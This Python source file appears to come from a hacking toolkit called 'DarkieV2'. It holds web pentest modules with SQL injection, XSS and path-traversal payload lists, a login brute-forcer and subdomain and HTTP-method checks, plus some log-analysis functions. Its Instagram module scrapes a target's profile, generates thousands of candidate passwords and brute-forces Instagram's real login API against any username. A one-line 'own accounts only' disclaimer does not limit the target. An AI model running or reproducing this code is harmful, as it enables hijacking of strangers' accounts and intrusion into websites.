WEB_ATTACK_PATHS = [
    ("SQL Injection", "sql_test"),
    ("XSS", "xss_test"),
    ("Command Injection", "cmd_test"),
    ("Path Traversal", "path_test"),
]


def pentest_sqli():
    header_box("SQL Injection Detector", Fore.GREEN)
    url = input(f"  {c(f'Enter URL with parameter (e.g. http://example.com?id=1) {SYM_PROMPT} ', Fore.CYAN)}").strip()
    if not url:
        print(f"  {RED}No URL.{RESET}")
        return

    payloads = [
        ("' OR '1'='1", "Single quote + tautology"),
        ("' OR '1'='1' --", "Single quote + comment"),
        ("' UNION SELECT NULL--", "UNION NULL"),
        ("' UNION SELECT 1,2,3--", "UNION columns"),
        ("admin' --", "Auth bypass"),
        ("1' AND 1=1--", "AND true"),
        ("1' AND 1=2--", "AND false"),
        ('" OR "1"="1', "Double quote"),
        ("1' ORDER BY 1--", "ORDER BY probe"),
        ("1' ORDER BY 100--", "ORDER BY column count"),
    ]

    print(f"\n  {c(f'Testing {len(payloads)} SQL injection payloads...', Fore.CYAN)}")
    print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")

    for payload, desc in payloads:
        try:
            if "?" in url:
                base_url, qs = url.split("?", 1)
                params = dict(p.split("=", 1) for p in qs.split("&") if "=" in p)
                if params:
                    first_key = list(params.keys())[0]
                    params[first_key] = payload.lstrip("&")
                    test_url = base_url + "?" + "&".join(f"{k}={v}" for k, v in params.items())
                else:
                    test_url = url + payload
            else:
                test_url = url + "?" + payload.lstrip("?")
            r = requests.get(test_url, timeout=5, headers={"User-Agent": "DarkieV2/1.0"})
            indicators = []
            if r.status_code == 200 and any(x in r.text.lower() for x in ["sql", "mysql", "syntax", "odbc", "driver", "warning", "unexpected"]):
                indicators.append("DB error in response")
            if len(r.text) > 2000 and "1=1" in payload:
                indicators.append("Length anomaly")
            if indicators:
                print(f"  {RED}{SYM_WARN} Potential SQLi: {c(payload[:30], Fore.RED)} ({desc})")
                for ind in indicators:
                    print(f"    {c(ind, Fore.YELLOW)}")
                add_log_alert("HIGH", "Pentest SQLi", f"SQLi detected on {url}: {payload}")
            else:
                print(f"  {c(SYM_CHECK, Fore.GREEN)} {c(f'{desc:30s}', Fore.GREEN)} {c('No obvious injection', Fore.DIM)}")
        except Exception as e:
            print(f"  {c(SYM_X, Fore.RED)} {c(f'{desc:30s}', Fore.RED)} Error: {e}")
    print()


def pentest_xss():
    header_box("XSS Scanner", Fore.GREEN)
    url = input(f"  {c(f'Enter URL to test {SYM_PROMPT} ', Fore.CYAN)}").strip()
    if not url:
        print(f"  {RED}No URL.{RESET}")
        return

    param = input(f"  {c(f'Parameter name to inject (default: q) {SYM_PROMPT} ', Fore.CYAN)}").strip() or "q"

    payloads = [
        ("<script>alert(1)</script>", "Basic script"),
        ("<img src=x onerror=alert(1)>", "Image onerror"),
        ('"><script>alert(1)</script>', "Tag break"),
        ("<svg onload=alert(1)>", "SVG onload"),
        ("javascript:alert(1)", "JS protocol"),
        ("'><img src=x onerror=alert(1)>", "Single quote break"),
    ]

    msg = "Testing %d XSS payloads on parameter '%s'..." % (len(payloads), param)
    print(f"\n  {c(msg, Fore.CYAN)}")
    print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")

    for payload, desc in payloads:
        try:
            parsed = urlparse(url)
            if parsed.query:
                r = requests.get(url, params={**dict(p.split("=") for p in parsed.query.split("&") if "=" in p), param: payload},
                               timeout=5, headers={"User-Agent": "DarkieV2/1.0"})
            else:
                r = requests.get(url, params={param: payload},
                               timeout=5, headers={"User-Agent": "DarkieV2/1.0"})
            if payload in r.text:
                print(f"  {RED}{SYM_WARN} XSS Reflected: {c(desc, Fore.RED)}")
                add_log_alert("HIGH", "Pentest XSS", f"XSS reflected on {url}: {desc}")
            else:
                print(f"  {c(SYM_CHECK, Fore.GREEN)} {c(f'{desc:30s}', Fore.GREEN)} Not reflected")
        except Exception as e:
            print(f"  {c(SYM_X, Fore.RED)} {c(f'{desc:30s}', Fore.RED)} Error: {e}")
    print()


def pentest_path_traversal():
    header_box("Path Traversal Tester", Fore.GREEN)
    url = input(f"  {c(f'Enter base URL {SYM_PROMPT} ', Fore.CYAN)}").strip()
    if not url:
        print(f"  {RED}No URL.{RESET}")
        return

    payloads = [
        ("../../etc/passwd", "/etc/passwd"),
        ("../../../etc/passwd", "/etc/passwd (deep)"),
        ("../../windows/win.ini", "Windows config"),
        ("../etc/passwd%00", "Null byte injection"),
        ("..%252f..%252fetc/passwd", "Double encoding"),
        ("../../../../../../../../etc/passwd", "Very deep traversal"),
    ]

    print(f"\n  {c(f'Testing {len(payloads)} path traversal payloads...', Fore.CYAN)}")
    print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")

    for payload, desc in payloads:
        try:
            test_url = url.rstrip('/') + '/' + payload.lstrip('/')
            r = requests.get(test_url, timeout=5, headers={"User-Agent": "DarkieV2/1.0"})
            indicators = []
            if "root:" in r.text and ":/bin/" in r.text:
                indicators.append("/etc/passwd contents leaked")
            if "[fonts]" in r.text or "for 16-bit" in r.text:
                indicators.append("win.ini contents leaked")
            if len(r.text) > 500:
                indicators.append(f"Unusually large response ({len(r.text)}B)")
            if indicators:
                print(f"  {RED}{SYM_WARN} Path Traversal: {c(desc, Fore.RED)}")
                for ind in indicators:
                    print(f"    {c(ind, Fore.YELLOW)}")
                add_log_alert("HIGH", "Pentest Path", f"Path traversal on {url}: {desc}")
            else:
                print(f"  {c(SYM_CHECK, Fore.GREEN)} {c(f'{desc:30s}', Fore.GREEN)} No leak detected")
        except Exception as e:
            print(f"  {c(SYM_X, Fore.RED)} {c(f'{desc:30s}', Fore.RED)} Error: {e}")
    print()


def pentest_subdomain_takeover():
    header_box("Subdomain Takeover Checker", Fore.GREEN)
    print(f"  {c('Check if a domain is vulnerable to subdomain takeover.', Fore.CYAN)}")
    domain = input(f"  {c(f'Enter domain (e.g. example.com) {SYM_PROMPT} ', Fore.CYAN)}").strip().lower()
    if not domain:
        print(f"  {RED}No domain.{RESET}")
        return

    print(f"\n  {c('Checking for CNAME records pointing to unclaimed services...', Fore.CYAN)}")
    print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")

    has_dig = shutil.which("dig")
    vulnerable_services = {
        "github.io": "GitHub Pages",
        "s3.amazonaws.com": "AWS S3",
        "s3-website": "AWS S3 Website",
        "cloudfront.net": "AWS CloudFront",
        "azurewebsites.net": "Azure App Service",
        "trafficmanager.net": "Azure Traffic Manager",
        "azureedge.net": "Azure CDN",
        "herokuapp.com": "Heroku",
        "herokudns.com": "Heroku DNS",
        "firebaseio.com": "Firebase",
        "appspot.com": "Google App Engine",
        "pantheonsite.io": "Pantheon",
        "wordpress.com": "WordPress.com",
        "squarespace.com": "Squarespace",
        "unbouncepages.com": "Unbounce",
        "statuspage.io": "StatusPage.io",
        "freshdesk.com": "Freshdesk",
        "zendesk.com": "Zendesk",
        "helpscoutdocs.com": "HelpScout",
        "atlassian.net": "Atlassian",
        "shopify.com": "Shopify",
        "myshopify.com": "Shopify",
        "thinkific.com": "Thinkific",
        "teachable.com": "Teachable",
    }

    # Check common subdomains
    common_subs = ["www", "blog", "shop", "store", "mail", "cdn", "api", "dev", "staging",
                   "test", "admin", "support", "help", "docs", "wiki", "status", "app", "m"]
    found_takeovers = []

    for sub in common_subs:
        fqdn = f"{sub}.{domain}"
        if has_dig:
            try:
                r = subprocess.run(["dig", "+short", "CNAME", fqdn], capture_output=True, text=True, timeout=5)
                cname = r.stdout.strip()
                if cname:
                    for service_pattern, service_name in vulnerable_services.items():
                        if service_pattern in cname.lower():
                            found_takeovers.append((fqdn, cname, service_name))
                            print(f"  {RED}{SYM_WARN} POTENTIAL TAKEOVER: {c(fqdn, Fore.RED)} -> {c(cname, Fore.YELLOW)} [{service_name}]{RESET}")
                            add_log_alert("CRITICAL", "Pentest Subdomain", f"Takeover risk: {fqdn} -> {cname} ({service_name})")
                            break
            except Exception:
                pass
        else:
            try:
                ip = socket.gethostbyname(fqdn)
                if ip.startswith("192.0.2.") or ip == "0.0.0.0":
                    found_takeovers.append((fqdn, ip, "Unclaimed IP range"))
                    print(f"  {RED}{SYM_WARN} POTENTIAL: {c(fqdn, Fore.RED)} -> {c(ip, Fore.YELLOW)} (unclaimed){RESET}")
            except socket.gaierror:
                pass

    if not found_takeovers:
        print(f"  {GREEN}{SYM_CHECK} No obvious subdomain takeover risks detected.{RESET}")
    else:
        print(f"\n  {RED}{SYM_WARN} {len(found_takeovers)} potential takeover(s) detected!{RESET}")
    print()


def pentest_http_methods():
    header_box("HTTP Methods Fuzzer", Fore.GREEN)
    url = input(f"  {c(f'Enter target URL {SYM_PROMPT} ', Fore.CYAN)}").strip()
    if not url:
        print(f"  {RED}No URL.{RESET}")
        return

    methods = ["GET", "POST", "PUT", "DELETE", "OPTIONS", "HEAD", "PATCH", "TRACE", "CONNECT"]

    print(f"\n  {c('Testing HTTP methods...', Fore.CYAN)}")
    print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")

    for method in methods:
        try:
            r = requests.request(method, url, timeout=5, headers={"User-Agent": "DarkieV2/1.0"})
            status = r.status_code
            if status not in (405, 501, 403, 404):
                color = Fore.RED if method in ("PUT", "DELETE", "TRACE", "CONNECT") else Fore.YELLOW
                print(f"  {c(f'{method:8s}', color)} {c(f'[{status}]', Fore.GREEN)} {c('Enabled', color)}")
                if method in ("PUT", "DELETE", "TRACE", "CONNECT"):
                    add_log_alert("WARN", "Pentest HTTP", f"Dangerous HTTP method enabled: {method} on {url}")
            else:
                print(f"  {c(f'{method:8s}', Fore.GREEN)} {c(f'[{status}]', YELLOW)} {c('Disabled', Fore.DIM)}")
        except Exception as e:
            print(f"  {c(f'{method:8s}', Fore.RED)} {c('Error:', Fore.RED)} {e}")
    print()


def pentest_bruteforce_login():
    header_box("Brute-Force Login Tester", Fore.GREEN)
    url = input(f"  {c(f'Enter login URL {SYM_PROMPT} ', Fore.CYAN)}").strip()
    if not url:
        print(f"  {RED}No URL.{RESET}")
        return

    username_param = input(f"  {c(f'Username parameter (default: username) {SYM_PROMPT} ', Fore.CYAN)}").strip() or "username"
    password_param = input(f"  {c(f'Password parameter (default: password) {SYM_PROMPT} ', Fore.CYAN)}").strip() or "password"

    usernames = ["admin", "root", "user", "test", "administrator", "guest", "admin@admin.com"]
    passwords = ["admin", "password", "123456", "admin123", "root", "test", "password123",
                 "admin1", "P@ssw0rd", "letmein", "welcome", "qwerty"]

    print(f"\n  {c(f'Testing {len(usernames)} x {len(passwords)} combinations...', Fore.CYAN)}")
    print(f"  {c('This can be detected as an attack. Use only on authorized systems.', Fore.RED)}")
    print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")

    found = 0
    for user in usernames:
        for pwd in passwords:
            try:
                data = {username_param: user, password_param: pwd}
                r = requests.post(url, data=data, timeout=8, headers={"User-Agent": "DarkieV2/1.0"})
                r.raise_for_status()
                success_indicators = ["dashboard", "welcome", "logout", "profile", "session"]
                if any(ind in r.text.lower() for ind in success_indicators) and r.status_code == 200:
                    print(f"  {RED}{SYM_WARN} LOGIN SUCCESS: {user}:{pwd}{RESET}")
                    add_log_alert("CRITICAL", "Pentest BruteForce", f"Login credentials found: {user}:{pwd}")
                    found += 1
                    break
            except requests.RequestException:
                pass
            time.sleep(0.5)  # Rate limiting to avoid lockout
        if found:
            break

    if not found:
        print(f"  {GREEN}{SYM_CHECK} No weak credentials found (limited wordlist).{RESET}")
    print()


def pentest_instagram():
    header_box("Instagram OSINT & Auth Tester", Fore.MAGENTA)
    print(f"  {Back.RED}{Fore.WHITE} DISCLAIMER {Style.RESET_ALL}{Fore.YELLOW}  For educational use only. Test only your own accounts.{Style.RESET_ALL}\n")
    user = input(f"  {c(f'Instagram username {SYM_PROMPT} ', Fore.CYAN)}").strip()
    if not user: return
    print(f"\n  {c('Gathering public info...', Fore.CYAN)}")
    lines = [f"  Username: {c(user, Fore.GREEN)}"]
    try:
        r = requests.get(f"https://www.instagram.com/{user}/", timeout=10,
            headers={"User-Agent": "Mozilla/5.0 (compatible; DarkieV2)"})
        if r.status_code == 200:
            import re
            m = re.search(r'window\.__INITIAL_STATE__\s*=\s*({.*?});', r.text, re.DOTALL)
            if m:
                import json
                data = json.loads(m.group(1))
                ep = data.get("entry_data", {}).get("ProfilePage", [{}])[0].get("graphql", {}).get("user", {})
                if ep.get("username") == user:
                    flw = ep.get("edge_followed_by", {}).get("count", "?")
                    flg = ep.get("edge_follow", {}).get("count", "?")
                    pst = ep.get("edge_owner_to_timeline_media", {}).get("count", "?")
                    lines.append(f"  Full Name: {c(ep.get('full_name', 'N/A'), Fore.CYAN)}")
                    lines.append(f"  Bio: {c(ep.get('biography', 'N/A')[:50], Fore.YELLOW)}")
                    lines.append(f"  Followers: {c(str(flw), Fore.MAGENTA)}")
                    lines.append(f"  Following: {c(str(flg), Fore.MAGENTA)}")
                    lines.append(f"  Posts: {c(str(pst), Fore.MAGENTA)}")
                    is_priv = ep.get("is_private", False)
                    lines.append(f"  Private: {c(str(is_priv), Fore.RED if is_priv else Fore.GREEN)}")
                    if ep.get("is_business_account"): lines.append(f"  Business: {c('Yes', Fore.GREEN)}")
                    if ep.get("is_verified"): lines.append(f"  Verified: {c(SYM_CHECK, Fore.GREEN)}")
                    ext_url = ep.get("external_url", "")
                    if ext_url: lines.append(f"  Website: {c(ext_url[:40], Fore.CYAN)}")
                    pfp = ep.get("profile_pic_url_hd", "")
                    if pfp: lines.append(f"  PFP: {c(pfp[:60]+'...', Fore.BLUE)}")
        else:
            lines.append(f"  Profile: {c('Private or not found', Fore.RED)}")
    except Exception as e:
        lines.append(f"  Error: {c(str(e)[:40], Fore.RED)}")
    info_box("Instagram Profile", lines, Fore.MAGENTA)

    print(f"\n  {c('Starting password audit...', Fore.YELLOW)}")
    print(f"  {c('Generating password combinations...', Fore.CYAN)}")

    base_words = [
        user, user.lower(), user.upper(), user.capitalize(),
        "instagram", "password", "123456", "qwerty", "iloveyou",
        "welcome", "monkey", "dragon", "master", "shadow", "sunshine",
        "princess", "football", "baseball", "charlie", "michael",
        "ashley", "batman", "access", "hello", "chocolate", "secret",
        "summer", "winter", "spring", "autumn", "trustno1", "letmein",
    ]
    numbers = ["", "1", "12", "123", "1234", "12345", "123456", "007", "69", "420",
               "2024", "2023", "2025", "2026", "2020", "2021", "2022",
               "0", "00", "000", "7", "77", "777", "7777",
               "2", "3", "4", "5", "6", "8", "9", "10", "11", "13", "21"]
    symbols_arr = ["", "!", "@", "#", "$", "%", "&", "*", "?", ".", "_", "-"]
    years = ["2020", "2021", "2022", "2023", "2024", "2025", "2026",
             "20", "21", "22", "23", "24", "25", "26"]

    passwords = set()
    for w in base_words:
        passwords.add(w)
        for n in numbers:
            passwords.add(f"{w}{n}")
            passwords.add(f"{n}{w}")
        for s in symbols_arr:
            passwords.add(f"{w}{s}")
            for n in numbers[:10]:
                passwords.add(f"{w}{s}{n}")
                passwords.add(f"{n}{w}{s}")
        for y in years:
            passwords.add(f"{w}{y}")
            passwords.add(f"{y}{w}")
        passwords.add(f"{w}!")
        passwords.add(f"{w}@")
        passwords.add(f"{w}#")
        passwords.add(f"{w}123")
        passwords.add(f"{w}123!")
        passwords.add(f"{w}@123")

    common_additional = [
        "admin", "root", "test", "guest", "default", "changeme", "password1",
        "password123", "passw0rd", "P@ssw0rd", "P@$$w0rd", "admin123",
        "admin2024", "root123", "toor", "qwerty123", "qwerty12345",
        "abc123", "123456789", "12345678", "1234567890", "111111", "000000",
        "121212", "654321", "696969", "123123", "abc1234", "1234abc",
        "1q2w3e4r", "qwertyuiop", "asdfghjkl", "zxcvbnm",
        "iloveyou!", "iloveyou123", "lovely", "family", "friend",
        "forever", "star", "moon", "sun", "sky", "blue", "red",
        "purple", "orange", "yellow", "green", "pink", "violet",
        "naruto", "goku", "sasuke", "luffy", "onepiece", "dragonball",
        "taylor", "swift", "justin", "bieber", "selena", "gomez",
        "rihanna", "eminem", "drake", "kanye", "beyonce", "adele",
        "fuckyou", "bitch", "motherfucker", "sex", "sexy", "horny",
        "blowjob", "pussy", "dick", "cock", "ass", "tits", "boobs",
        "money", "cash", "dollar", "bitcoin", "crypto", "nft",
        "hacker", "elite", "anonymous", "rootkit", "exploit",
        "school", "college", "university", "study", "book", "class",
        "apple", "google", "microsoft", "facebook", "twitter", "youtube",
        "netflix", "spotify", "amazon", "uber", "airbnb",
        "jesus", "christ", "god", "faith", "bible", "heaven",
        "angel", "devil", "demon", "ghost", "phantom", "shadow",
        "sword", "shield", "blade", "warrior", "knight", "ninja",
        "thomas", "arnold", "james", "robert", "michael", "william",
        "david", "richard", "joseph", "daniel", "matthew", "anthony",
        "mark", "christopher", "steven", "paul", "andrew", "joshua",
        "kenneth", "kevin", "brian", "george", "timothy", "ronald",
        "edward", "jason", "jeffrey", "ryan", "jacob", "gary",
        "nicholas", "eric", "stephen", "larry", "justin", "scott",
        "jessica", "ashley", "sarah", "jennifer", "amanda", "emily",
        "megan", "nicole", "stephanie", "elizabeth", "lauren", "brittany",
        "amber", "melissa", "michelle", "heather", "tiffany", "rachel",
    ]
    for w in common_additional:
        passwords.add(w)
        for n in numbers:
            passwords.add(f"{w}{n}")
        passwords.add(f"{w}!")
        passwords.add(f"{w}@")
        passwords.add(f"{w}#")
        passwords.add(f"{w}123")

    passwords = [p for p in passwords if 4 <= len(p) <= 30]

    print(f"  {c(f'Generated {len(passwords)} password combinations', Fore.GREEN)}")
    print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")

    try:
        sess = requests.Session()
        login_resp = sess.get("https://www.instagram.com/accounts/login/ajax/", timeout=10,
            headers={"User-Agent": "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36"})
        csrf_match = re.search(r'csrf_token["\']\s*:\s*["\']([^"\']+)', login_resp.text)
        csrf = csrf_match.group(1) if csrf_match else ""
        if not csrf:
            csrf = sess.cookies.get("csrftoken", "")

        found = False
        found_pwd = ""
        total = len(passwords)
        tested = 0

        for pwd in passwords:
            tested += 1
            try:
                payload = {
                    "username": user,
                    "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{pwd}",
                    "queryParams": "{}",
                    "optIntoOneTap": "false",
                    "stopDeletionNonce": "",
                    "trustedDeviceRecords": "{}",
                }
                headers = {
                    "User-Agent": "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36",
                    "X-CSRFToken": csrf,
                    "X-Requested-With": "XMLHttpRequest",
                    "Referer": "https://www.instagram.com/accounts/login/",
                    "Content-Type": "application/x-www-form-urlencoded",
                }
                resp = sess.post(
                    "https://www.instagram.com/api/v1/web/accounts/login/ajax/",
                    data=payload,
                    headers=headers,
                    timeout=8,
                )
                j = resp.json()
                if j.get("authenticated") or j.get("status") == "ok" and not j.get("two_factor_required"):
                    found = True
                    found_pwd = pwd
                    break
                if j.get("two_factor_required"):
                    found = True
                    found_pwd = pwd
                    break
                if j.get("message") == "Please wait a few minutes before you try again.":
                    print(f"\n  {YELLOW}Rate limited. Waiting 60s...{RESET}")
                    time.sleep(60)
                    continue
            except Exception:
                pass

            if tested % 20 == 0 or tested == total:
                pct = tested / total * 100
                sys.stdout.write(f"\r  {progress_bar(tested, total)}  {c(f'{tested}/{total}', Fore.CYAN)}  {c('Testing...', Fore.YELLOW)}")
                sys.stdout.flush()

            if tested % 50 == 0:
                time.sleep(1)

        print()

        if found:
            print(f"\n  {Back.RED}{Fore.WHITE}{Style.BRIGHT}{'='*58}{Style.RESET_ALL}")
            print(f"  {Back.RED}{Fore.WHITE}{Style.BRIGHT}{SYM_WARN*3}  PASSWORD FOUND!  {SYM_WARN*3}{Style.RESET_ALL}")
            print(f"  {Back.RED}{Fore.WHITE}{Style.BRIGHT}{'='*58}{Style.RESET_ALL}")
            print(f"\n  {c(f'Account: {user}', Fore.RED)}")
            print(f"  {c(f'Password: {found_pwd}', Fore.RED)}")
            print(f"\n  {c(SYM_WARN + '  WARNING:', Fore.YELLOW)}")
            print(f"  {c('This password is weak and was found in the dictionary!', Fore.YELLOW)}")
            print(f"  {c('If this is YOUR account, change the password immediately.', Fore.RED)}")
            print(f"  {c('If this is NOT your account, contact the account holder', Fore.RED)}")
            print(f"  {c('and inform them their password has been compromised.', Fore.RED)}")
            print(f"\n  {c('Recommendation:', Fore.GREEN)} Use a 12+ character password with")
            print(f"  {c('uppercase, lowercase, numbers, and symbols.', Fore.GREEN)}")
            print(f"  {c('Enable 2FA for additional security.', Fore.GREEN)}")
            add_log_alert("CRITICAL", "Instagram Pentest", f"Password found for {user}: {found_pwd}")
        else:
            print(f"\n  {GREEN}{SYM_CHECK} No weak passwords found in dictionary ({tested} tried).{RESET}")
            print(f"  {c('The account appears to have a strong password.', Fore.GREEN)}")
            print(f"  {c('Note: Instagram rate-limiting and 2FA may block attempts.', Fore.YELLOW)}")

    except KeyboardInterrupt:
        print(f"\n  {YELLOW}Password audit interrupted.{RESET}")
    except Exception as e:
        print(f"  {RED}Error: {e}{RESET}")
    print()


# ──────────────────────────────────────────────────────────
#  MODULE 6: SIEM & LOG ANALYSIS
# ──────────────────────────────────────────────────────────

def siem_log_analyzer():
    header_box("Log File Analyzer", Fore.CYAN)
    log_path = input(f"  {c(f'Enter log file path {SYM_PROMPT} ', Fore.CYAN)}").strip()
    if not log_path or not os.path.exists(log_path):
        print(f"  {RED}{SYM_X} File not found.{RESET}")
        return

    print(f"\n  {c('Analyzing log file...', Fore.CYAN)}")
    print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")

    try:
        with open(log_path) as f:
            lines = f.readlines()
    except Exception as e:
        print(f"  {RED}{SYM_X} Error reading file: {e}{RESET}")
        return

    print(f"  Total lines:  {c(f'{len(lines):,}', Fore.GREEN)}")

    # Pattern analysis
    patterns = {
        "ERROR": 0, "WARN": 0, "INFO": 0, "DEBUG": 0,
        "FAILED": 0, "DENIED": 0, "TIMEOUT": 0, "TIMED OUT": 0,
    }

    ip_counts = defaultdict(int)
    error_lines = []

    for line in lines:
        line_upper = line.upper()
        for pattern in patterns:
            if pattern in line_upper:
                patterns[pattern] += 1
        ips = re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', line)
        for ip in ips:
            ip_counts[ip] += 1
        if re.search(r'(ERROR|FAILED|DENIED|CRITICAL)', line_upper):
            error_lines.append(line.strip())

    print(f"\n  {c('Log Event Breakdown:', Fore.CYAN)}")
    for pattern, count in patterns.items():
        if count > 0:
            color = Fore.RED if pattern in ("ERROR", "FAILED", "DENIED") else Fore.YELLOW if pattern == "WARN" else Fore.GREEN
            bar = SYM_BLOCK_FULL * min(count // max(len(lines) // 20, 1), 20)
            print(f"    {c(f'{pattern:10s}', color)} {c(f'{count:>6d}', Fore.CYAN)} {c(bar, color)}")

    if error_lines:
        print(f"\n  {c('Sample Errors:', Fore.RED)}")
        for line in error_lines[:5]:
            print(f"    {c(line[:120], Fore.RED)}")

    if ip_counts:
        print(f"\n  {c('Top IPs:', Fore.CYAN)}")
        for ip, count in sorted(ip_counts.items(), key=lambda x: -x[1])[:10]:
            print(f"    {c(f'{ip:15s}', Fore.GREEN)} {c(f'{count:>6d}', Fore.CYAN)} requests")

    print()


def siem_realtime_monitor():
    header_box("Real-time Log Monitor", Fore.CYAN)
    log_path = input(f"  {c(f'Enter log file path to tail {SYM_PROMPT} ', Fore.CYAN)}").strip()
    if not log_path or not os.path.exists(log_path):
        print(f"  {RED}{SYM_X} File not found.{RESET}")
        return

    duration = input(f"  {c(f'Monitor duration (seconds, default 30) {SYM_PROMPT} ', Fore.CYAN)}").strip()
    duration = int(duration) if duration.isdigit() else 30

    print(f"\n  {c(f'Tailing {log_path} for {duration}s...', Fore.CYAN)}")
    print(f"  {c('Press Ctrl+C to stop', Fore.YELLOW)}")
    print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")

    try:
        with open(log_path) as f:
            f.seek(0, 2)
            start = time.time()
            while time.time() - start < duration:
                line = f.readline()
                if line:
                    line = line.strip()
                    if re.search(r'(ERROR|CRITICAL|FAILED)', line, re.IGNORECASE):
                        print(f"  {RED}{line[:120]}{RESET}")
                        add_log_alert("HIGH", "Log Monitor", line[:120])
                    elif re.search(r'(WARN|DENIED)', line, re.IGNORECASE):
                        print(f"  {YELLOW}{line[:120]}{RESET}")
                    else:
                        print(f"  {c(line[:120], Fore.GREEN)}")
                else:
                    time.sleep(0.1)
    except KeyboardInterrupt:
        print(f"\n  {YELLOW}{SYM_WARN} Stopped by user{RESET}")
    except Exception as e:
        print(f"  {RED}{SYM_X} Error: {e}{RESET}")
    print()


def siem_alert_viewer():
    header_box("Alert Dashboard", Fore.CYAN)
    print(f"  {c('Recent security alerts:', Fore.CYAN)}")
    print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")

    if not LOG_ALERTS:
        print(f"  {YELLOW}No alerts generated yet. Run other modules to generate alerts.{RESET}")

    for alert in LOG_ALERTS[-30:]:
        ts = alert["timestamp"]
        level = alert["level"]
        src = alert["source"]
        msg = alert["message"][:80]

        if level in ("CRITICAL", "HIGH"):
            color = Fore.RED
        elif level == "WARN":
            color = Fore.YELLOW
        else:
            color = Fore.GREEN

        print(f"  {c(f'[{ts}]', Fore.CYAN)} {c(f'[{level:8s}]', color)} {c(f'{src:20s}', Fore.MAGENTA)} {c(msg, Fore.GREEN)}")

    print(f"\n  {c(f'Total alerts: {len(LOG_ALERTS)}', Fore.CYAN)}")
    print()


def siem_threat_patterns():
    header_box("Threat Pattern Detection", Fore.CYAN)
    print(f"  {c('Scanning for known threat patterns...', Fore.CYAN)}")
    print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")

    patterns_found = []
    check_paths = []
    system = platform.system().lower()

    if system == "linux":
        check_paths = ["/var/log/auth.log", "/var/log/secure", "/var/log/syslog",
                       "/var/log/apache2/access.log", "/var/log/nginx/access.log"]
    elif system == "darwin":
        check_paths = ["/var/log/system.log", "/var/log/apache2/access_log", "/var/log/nginx/access_log"]
    elif system == "windows":
        print(f"  {YELLOW}Use Event Viewer for Windows threat detection.{RESET}")
        print(f"  {YELLOW}Run: wevtutil qe Security /q:*[System[EventID=4625]]{RESET}")

    for log_path in check_paths:
        if os.path.exists(log_path):
            try:
                with open(log_path) as f:
                    content = f.read()

                # Check for specific threats
                if re.search(r'Failed password.*root', content):
                    patterns_found.append(("SSH Brute-force (root)", log_path))
                if re.search(r'Invalid user', content):
                    patterns_found.append(("SSH User Enumeration", log_path))
                if re.search(r'Possible SYN flooding', content):
                    patterns_found.append(("SYN Flood / DDoS", log_path))
                if re.search(r'authentication failure', content):
                    patterns_found.append(("Auth Failures", log_path))
                if re.search(r'Did not receive identification', content):
                    patterns_found.append(("SSH Scan Probe", log_path))
                if re.search(r'pam_unix.*authentication failure', content):
                    patterns_found.append(("PAM Auth Failures", log_path))
            except Exception:
                pass

    if patterns_found:
        print(f"  {RED}{SYM_WARN} Threat patterns detected:{RESET}")
        for pattern, source in patterns_found:
            print(f"    {SYM_LINE_V}{SYM_LINE_H} {c(pattern, Fore.RED)} ({c(source, Fore.CYAN)})")
            add_log_alert("HIGH", "Threat Detection", f"Pattern: {pattern} in {source}")
    else:
        print(f"  {GREEN}{SYM_CHECK} No common threat patterns detected in logs.{RESET}")

    print(f"\n  {c('Total alerts in this session:', Fore.CYAN)} {c(str(len(LOG_ALERTS)), Fore.GREEN)}")
    print()


# ──────────────────────────────────────────────────────────
#  LEGACY MODULES (v1.2 / v1.3 features)
# ──────────────────────────────────────────────────────────

COUNTRY_CODES = {
    "1": "US/CA", "44": "UK", "91": "India", "86": "China", "81": "Japan",
    "49": "Germany", "33": "France", "39": "Italy", "34": "Spain", "7": "Russia",
    "55": "Brazil", "61": "Australia", "82": "Korea", "31": "Netherlands",
    "46": "Sweden", "41": "Switzerland", "45": "Denmark", "47": "Norway",
    "358": "Finland", "48": "Poland", "90": "Turkey", "966": "Saudi Arabia",
    "971": "UAE", "972": "Israel", "27": "South Africa", "52": "Mexico",
    "54": "Argentina", "56": "Chile", "57": "Colombia", "351": "Portugal",
    "30": "Greece", "353": "Ireland", "43": "Austria", "32": "Belgium",
}

NPA_DB = {
    "201": ("Jersey City", "NJ", "Eastern"), "202": ("Washington", "DC", "Eastern"),
    "203": ("Bridgeport", "CT", "Eastern"), "212": ("New York City", "NY", "Eastern"),
    "213": ("Los Angeles", "CA", "Pacific"), "214": ("Dallas", "TX", "Central"),
    "215": ("Philadelphia", "PA", "Eastern"), "310": ("Los Angeles", "CA", "Pacific"),
    "312": ("Chicago", "IL", "Central"), "313": ("Detroit", "MI", "Eastern"),
    "314": ("St. Louis", "MO", "Central"), "315": ("Syracuse", "NY", "Eastern"),
    "316": ("Wichita", "KS", "Central"), "317": ("Indianapolis", "IN", "Eastern"),
    "323": ("Los Angeles", "CA", "Pacific"), "347": ("Brooklyn", "NY", "Eastern"),
    "408": ("San Jose", "CA", "Pacific"), "412": ("Pittsburgh", "PA", "Eastern"),
    "413": ("Springfield", "MA", "Eastern"), "414": ("Milwaukee", "WI", "Central"),
    "415": ("San Francisco", "CA", "Pacific"), "416": ("Toronto", "ON", "Eastern"),
    "417": ("Springfield", "MO", "Central"), "425": ("Bellevue", "WA", "Pacific"),
    "443": ("Baltimore", "MD", "Eastern"), "469": ("Plano", "TX", "Central"),
    "480": ("Phoenix", "AZ", "Mountain"), "503": ("Portland", "OR", "Pacific"),
    "504": ("New Orleans", "LA", "Central"), "510": ("Oakland", "CA", "Pacific"),
    "512": ("Austin", "TX", "Central"), "513": ("Cincinnati", "OH", "Eastern"),
    "515": ("Des Moines", "IA", "Central"), "516": ("Hempstead", "NY", "Eastern"),
    "530": ("Redding", "CA", "Pacific"), "540": ("Roanoke", "VA", "Eastern"),
